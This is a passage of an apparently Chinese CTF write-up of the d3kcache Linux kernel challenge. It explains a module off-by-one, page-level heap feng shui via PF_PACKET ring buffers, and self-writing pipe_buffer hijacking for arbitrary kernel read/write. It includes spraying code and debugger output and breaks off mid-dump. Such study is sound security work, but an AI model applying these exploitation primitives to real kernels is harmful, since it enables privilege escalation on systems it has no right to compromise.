  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/05/%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4+%E8%87%AA%E5%86%99%E7%AE%A1%E9%81%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/05/%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4+%E8%87%AA%E5%86%99%E7%AE%A1%E9%81%93/" class="post-title-link" itemprop="url">页级堆风水+自写管道</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-12-05 21:28:10 / Modified: 21:31:28" itemprop="dateCreated datePublished" datetime="2023-12-05T21:28:10+08:00">2023-12-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>51k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>46 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>d3kcache</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -smp cores=2,threads=2 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -hda ./rootfs.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -append &quot;console=ttyS0 root=/dev/sda rw rdinit=/sbin/init kaslr pti=on quiet oops=panic panic=1&quot; \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>
<ul>
<li>smep，smap，kaslr，pti</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">chown -R root:root /</span><br><span class="line">chmod 700 /root</span><br><span class="line">chown -R ctf:ctf /home/ctf</span><br><span class="line">chown root:root /root/flag</span><br><span class="line">chmod 600 /root/flag</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">insmod /root/d3kcache.ko</span><br><span class="line">chmod 666 /dev/d3kcache</span><br><span class="line"></span><br><span class="line">cat /root/banner</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line"></span><br><span class="line">cd /home/ctf</span><br><span class="line">setsid cttyhack su ctf -c /bin/sh</span><br><span class="line"><span class="meta">#</span><span class="bash">setsid cttyhack setuidgid 1000 sh</span></span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<ul>
<li>dmesg_restrict</li>
<li>kptr_restrict</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y # 开启内存控制器(GFP_KERNEL和GFP_ACCOUNT之间存在隔离)</span><br><span class="line">CONFIG_MEMCG=y # 开启Control-Flow Integrity控制流完整性(内核ROP失效)</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y # 开启slab freelist随机化</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y </span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>漏洞点如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !copy_from_user(kdata, ptr, size) )</span><br><span class="line">&#123;</span><br><span class="line">  kdata[size] = <span class="number">0</span>;                    <span class="comment">// 末尾置空，off-by-one</span></span><br><span class="line">  re = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>内核 off-by-one</li>
</ul>
<p>程序的 <code>kmem_cache</code> 是独立的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)module_device &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_A66);</span><br><span class="line">  spin = <span class="number">0</span>;</span><br><span class="line">  kcache_jar = kmem_cache_create_usercopy(<span class="string">&quot;kcache_jar&quot;</span>, <span class="number">2048LL</span>, <span class="number">0LL</span>, <span class="number">67379200LL</span>, <span class="number">0LL</span>, <span class="number">2048LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(kcache_list, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>只能考虑 cross-cache overflow</li>
</ul>
<p><strong>页级堆风水</strong></p>
<p>页级堆风水即以内存页为粒度的内存排布方式，这种利用手法实际上是让我们手工构造一个新的已知的页级粒度内存页排布</p>
<p>从更高阶 order 拆分成的两份低阶 order 的连续内存页是物理连续的，由此我们可以：</p>
<ul>
<li>向 buddy system 请求两份连续的内存页</li>
<li>释放其中一份内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这份内存页</li>
<li>释放另一份内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这份内存页</li>
</ul>
<p>接下来利用内核模块的 off-by-one 就可能溢出到其他的内核结构体上</p>
<p>可以使用如下方案来构建页级堆风水：</p>
<ul>
<li>创建一个 protocol 为 <code>PF_PACKET</code> 的 socket</li>
<li>调用 <code>setsockopt</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1</code> 或者 <code>TPACKET_V2</code></li>
<li>调用 <code>setsockopt</code> 提交一个 <code>PACKET_TX_RING</code> </li>
</ul>
<p>此时便存在如下调用链： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__sys_setsockopt() -&gt; sock-&gt;ops-&gt;setsockopt() -&gt; packet_setsockopt() -&gt; packet_set_ring() -&gt; alloc_pg_vec()</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct pgv *<span class="title">alloc_pg_vec</span><span class="params">(struct tpacket_req *req, <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(struct pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">	free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">	pg_vec = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>用以分配 <code>tp_block_nr</code> 份 <code>2^order</code> 内存页（其中 <code>order</code> 由 <code>tp_block_size</code> 决定）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">alloc_one_pg_vec_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *buffer;</span><br><span class="line">	<span class="keyword">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="keyword">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* __get_free_pages failed, fall back to vmalloc */</span></span><br><span class="line">	buffer = vzalloc(array_size((<span class="number">1</span> &lt;&lt; order), PAGE_SIZE));</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* vmalloc failed, lets dig into swap here */</span></span><br><span class="line">	gfp_flags &amp;= ~__GFP_NORETRY;</span><br><span class="line">	buffer = (<span class="keyword">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* complete and utter failure */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>直接调用 <code>__get_free_pages()</code> 向 buddy system 请求内存页，因此可以利用该函数进行大量的页面请求</li>
</ul>
<p><strong>自写管道</strong></p>
<p>当我们创建一个管道时，在内核中会生成16个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>pipe 系统调用提供了 <code>fcntl(F_SETPIPE_SZ)</code> 让我们可以重新分配 <code>pipe_buffer</code> 并指定其数量</li>
</ul>
<p>自写管道的核心就是劫持 <code>pipe_buffer-&gt;page</code>，使该 <code>page</code> 结构体映射 <code>pipe_buffer</code> 本身所在的物理页面，通过多个这样的自写管道就可以构造出一个近乎无限制的任意读写系统</p>
<p>内核结构体 <code>pipe_buffer</code> 的第一个条目为 <code>page</code>，覆盖其低位就可能导致 <code>page</code> 重叠：</p>
<ul>
<li>覆盖低位后，<code>pipe_buffer1-1-&gt;page</code> 和 <code>pipe_buffer1-2-&gt;page</code> 指向同一个 page</li>
</ul>
<p><img src="/2023/12/05/%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4+%E8%87%AA%E5%86%99%E7%AE%A1%E9%81%93/1700041832088.png" alt="1700041832088"> </p>
<p>接下来就可以利用 UAF <code>pipe_buffer</code> 来泄露数据：</p>
<ul>
<li>释放 UAF <code>pipe_buffer</code>（4k的缓冲页也会被释放，释放之后数据不会清除仍然可读写）</li>
<li>使用 <code>fcntl(F_SETPIPE_SZ)</code> 重新分配 <code>pipe_buffer</code>，部分的 <code>pipe_buffer</code> 就会被申请到之前我们释放的4k缓冲页上</li>
<li>利用 UAF 对4k缓冲页进行读取就可以泄露地址</li>
</ul>
<p><img src="/2023/12/05/%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4+%E8%87%AA%E5%86%99%E7%AE%A1%E9%81%93/1700043734977.png" alt="1700043734977"> </p>
<p>修改可控的 <code>pipe_buffer2-&gt;page</code>，即可完成二级 UAF：</p>
<ul>
<li>利用之前的 UAF 可以修改 <code>pipe_buffer2-1-&gt;page</code>，使 <code>pipe_buffer2-1-&gt;page</code> 和 <code>pipe_buffer2-2-&gt;page</code> 指向同一个 page，构成二级 UAF</li>
</ul>
<p><img src="/2023/12/05/%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4+%E8%87%AA%E5%86%99%E7%AE%A1%E9%81%93/1700044287875.png" alt="1700044287875">  </p>
<p>用同样的方法将 <code>pipe_buffer3</code> 申请到4k缓冲页上，并利用二级 UAF 覆盖 <code>pipe_buffer3-&gt;page</code> 为 <code>pipe_buffer2-&gt;page</code></p>
<ul>
<li>由于 <code>pipe_buffer2-&gt;page</code> 映射 <code>pipe_buffer3</code> 所在的物理页面，现在 <code>pipe_buffer3</code> 成为 <code>self-writing pipe</code></li>
</ul>
<p><img src="/2023/12/05/%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4+%E8%87%AA%E5%86%99%E7%AE%A1%E9%81%93/1700045029863.png" alt="1700045029863">    </p>
<p>接着构造另外两个 <code>self-writing pipe</code>，直到将3个 <code>pipe_buffer</code> 修改为 <code>self-writing pipe</code>（执行 <code>write(pipe_list[target][1])</code> 可以修改 <code>pipe_buffer</code> 本身）</p>
<ul>
<li>这3个 <code>self-writing pipe</code> 在同一个页面上，并且它们的 <code>pipe_buffer-&gt;page</code> 都映射这个页面</li>
</ul>
<p>之后就可以进行 RAA 和 WAA 了，这里我们使用三个管道：</p>
<ul>
<li><code>self-writing pipe1</code>：用以进行内存空间中的任意读写，我们通过修改其 page 指针完成</li>
<li><code>self-writing pipe2</code>：用以修改 <code>self-writing pipe3</code>，使其写入的起始位置指向 <code>self-writing pipe1</code></li>
<li><code>self-writing pipe3</code>：用以修改 <code>self-writing pipe1</code> 与 <code>self-writing pipe2</code>，使得 <code>self-writing pipe1</code> 的 pipe 指针指向指定位置，<code>self-writing pipe2</code> 的写入起始位置指向 <code>self-writing pipe3</code></li>
</ul>
<p><strong>入侵思路</strong></p>
<p>先利用 <code>setsockopt</code> 构建好页级堆风水</p>
<p>在准备阶段，分别在 <code>socket_fd</code> 中部署好大量 1K，2K，8K 的页面：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_pgv_pages</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * We want a more clear and continuous memory there, which require us to </span></span><br><span class="line"><span class="comment">     * make the noise less in allocating order-3 pages.</span></span><br><span class="line"><span class="comment">     * So we pre-allocate the pages for those noisy objects there.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray 8 pages for page-level heap fengshui */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_4pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>alloc_page</code> 用于申请页面</li>
<li><code>free_page</code> 用于释放页面</li>
</ul>
<p>先释放高阶的页面，然后申请低阶的页面，在伙伴系统的分配下低阶页面大概率是物理连续的</p>
<p>利用这个方法部署连续的 <code>pipe_buffer</code>，然后在中间镶嵌一段内核模块申请的可控页面：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM/<span class="number">2</span>; i++) &#123;</span><br><span class="line">    <span class="comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span></span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        free_page(pgv_8pages_start_idx++); <span class="comment">// 8 * 4k</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span></span><br><span class="line">    <span class="keyword">if</span> (fcntl(pipe_list[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123; <span class="comment">// 8 * 4k</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">free_page(pgv_8pages_start_idx++); <span class="comment">// 8 * 4k</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123; <span class="comment">// 16 * 2k</span></span><br><span class="line">    add(i, <span class="number">8</span>, <span class="string">&quot;11111111&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = PIPE_NUM/<span class="number">2</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">    <span class="comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span></span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        free_page(pgv_8pages_start_idx++);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span></span><br><span class="line">    <span class="keyword">if</span> (fcntl(pipe_list[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123; <span class="comment">// 8 * 4k</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>触发 off-by-one，大概率会触发 cross-cache overflow 进而覆盖 <code>pipe_buffer-&gt;page</code> 的低位</p>
<p>此时两个 <code>pipe_buffer-&gt;page</code> 指向同一个 page，可以利用上述方法构造3个自写管道（详情见之前的博客）</p>
<p>构造完成后，调试信息如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff888007267000</span> —▸ <span class="number">0xffffea00001c9180</span> ◂— <span class="number">0xfffffc0000000</span> </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff888007267008</span> ◂— <span class="number">0x24</span> <span class="comment">/* &#x27;$&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff888007267010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xffff888007267018</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xffff888007267020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0xffff888007267040</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0xffff888007267080</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│  <span class="number">0xffff8880072670c0</span> —▸ <span class="number">0xffffea00001c99c0</span> ◂— <span class="number">0xfffffc0000200</span> <span class="comment">/* self-writing pipe1 */</span></span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│  <span class="number">0xffff8880072670c8</span> ◂— <span class="number">0xb8000000c8</span></span><br><span class="line"><span class="number">1</span>a:<span 